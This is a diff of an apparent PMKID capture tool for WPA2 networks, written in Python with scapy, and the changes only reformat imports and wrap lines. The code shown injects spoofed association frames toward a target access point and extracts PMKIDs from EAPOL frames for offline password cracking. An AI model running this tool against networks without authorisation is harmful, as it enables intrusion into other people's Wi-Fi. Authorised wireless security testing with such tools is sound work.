@@ -6,22 +6,21 @@ Clientless attack technique — no connected clients needed.
 Discovered by Jens "atom" Steube (hashcat developer).
 """
 
-import sys
-import os
 import argparse
-import threading
+import os
 import subprocess
+import sys
+import threading
 import time
 from datetime import datetime
 from typing import Optional
 
-from scapy.layers.dot11 import Dot11, Dot11Auth, Dot11AssoReq, Dot11Elt, RadioTap
+from scapy.layers.dot11 import Dot11, Dot11AssoReq, Dot11Auth, Dot11Elt, RadioTap
 from scapy.layers.eap import EAPOL
-from scapy.sendrecv import sniff, sendp
+from scapy.sendrecv import sendp, sniff
 from scapy.utils import wrpcap
 
-from utils import validate_mac, validate_interface, check_monitor_mode, require_root, setup_logging
-
+from utils import check_monitor_mode, require_root, setup_logging, validate_interface, validate_mac
 
 # PMKID KDE constants
 PMKID_KDE_TYPE = 0xDD
@@ -38,11 +37,15 @@ class PMKIDCapture:
     cracking without needing a connected client.
     """
 
-    def __init__(self, interface: str, target_bssid: str,
-                 channel: Optional[int] = None,
-                 output_dir: str = "captures",
-                 timeout: int = 60,
-                 client_mac: Optional[str] = None) -> None:
+    def __init__(
+        self,
+        interface: str,
+        target_bssid: str,
+        channel: Optional[int] = None,
+        output_dir: str = "captures",
+        timeout: int = 60,
+        client_mac: Optional[str] = None,
+    ) -> None:
         self.interface: str = interface
         self.target_bssid: str = target_bssid.upper()
         self.channel: Optional[int] = channel
@@ -86,11 +89,10 @@ class PMKIDCapture:
                 break
 
             if tag_type == PMKID_KDE_TYPE and tag_len >= 20:
-                tag_data = eapol_data[i + 2: i + 2 + tag_len]
+                tag_data = eapol_data[i + 2 : i + 2 + tag_len]
                 # Check OUI (3 bytes) and data type (1 byte)
-                if (tag_data[:3] == PMKID_KDE_OUI
-                        and tag_data[3] == PMKID_KDE_DATA_TYPE):
-                    pmkid_bytes = tag_data[4:4 + PMKID_LENGTH]
+                if tag_data[:3] == PMKID_KDE_OUI and tag_data[3] == PMKID_KDE_DATA_TYPE:
+                    pmkid_bytes = tag_data[4 : 4 + PMKID_LENGTH]
                     if len(pmkid_bytes) == PMKID_LENGTH:
                         pmkid_hex = pmkid_bytes.hex()
                         # Reject all-zero PMKIDs (AP doesn't support PMKID)
@@ -109,9 +111,7 @@ class PMKIDCapture:
         association request with RSN (WPA2) capabilities.
         """
         client = self.client_mac or "CC:CC:CC:CC:CC:CC"
-        self.logger.info(
-            "Sending association request: %s -> %s", client, self.target_bssid
-        )
+        self.logger.info("Sending association request: %s -> %s", client, self.target_bssid)
 
         try:
             # Authentication frame (Open System)
@@ -184,10 +184,7 @@ class PMKIDCapture:
                 return
 
             dot11 = packet[Dot11]
-            addrs = {
-                str(getattr(dot11, f"addr{i}", "") or "").upper()
-                for i in range(1, 4)
-            }
+            addrs = {str(getattr(dot11, f"addr{i}", "") or "").upper() for i in range(1, 4)}
 
             if self.target_bssid not in addrs:
                 return
@@ -213,7 +210,7 @@ class PMKIDCapture:
             if len(raw_data) >= 99:
                 key_data_len = int.from_bytes(raw_data[97:99], "big")
                 if key_data_len > 0 and len(raw_data) >= 99 + key_data_len:
-                    key_data = raw_data[99:99 + key_data_len]
+                    key_data = raw_data[99 : 99 + key_data_len]
                     pmkid = self._extract_pmkid(key_data)
                     if pmkid:
                         self.pmkid = pmkid
@@ -238,7 +235,9 @@ class PMKIDCapture:
             if validate_interface(self.interface):
                 subprocess.run(
                     ["iwconfig", self.interface, "channel", str(channel)],
-                    capture_output=True, text=True, timeout=5,
+                    capture_output=True,
+                    text=True,
+                    timeout=5,
                 )
                 self.logger.info("Set channel to %d", channel)
         except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
@@ -364,20 +363,19 @@ Note: Interface must be in monitor mode.
         """,
     )
 
-    parser.add_argument("-i", "--interface", required=True,
-                        help="Wireless interface in monitor mode")
-    parser.add_argument("-b", "--bssid", required=True,
-                        help="Target AP BSSID (MAC address)")
-    parser.add_argument("-ch", "--channel", type=int,
-                        help="Channel to listen on")
-    parser.add_argument("-o", "--output-dir", default="captures",
-                        help="Output directory (default: captures)")
-    parser.add_argument("-t", "--timeout", type=int, default=60,
-                        help="Capture timeout in seconds (default: 60)")
-    parser.add_argument("--client-mac",
-                        help="Client MAC to use for association (spoof)")
-    parser.add_argument("-v", "--verbose", action="store_true",
-                        help="Verbose output")
+    parser.add_argument(
+        "-i", "--interface", required=True, help="Wireless interface in monitor mode"
+    )
+    parser.add_argument("-b", "--bssid", required=True, help="Target AP BSSID (MAC address)")
+    parser.add_argument("-ch", "--channel", type=int, help="Channel to listen on")
+    parser.add_argument(
+        "-o", "--output-dir", default="captures", help="Output directory (default: captures)"
+    )
+    parser.add_argument(
+        "-t", "--timeout", type=int, default=60, help="Capture timeout in seconds (default: 60)"
+    )
+    parser.add_argument("--client-mac", help="Client MAC to use for association (spoof)")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
 
     args = parser.parse_args()
 
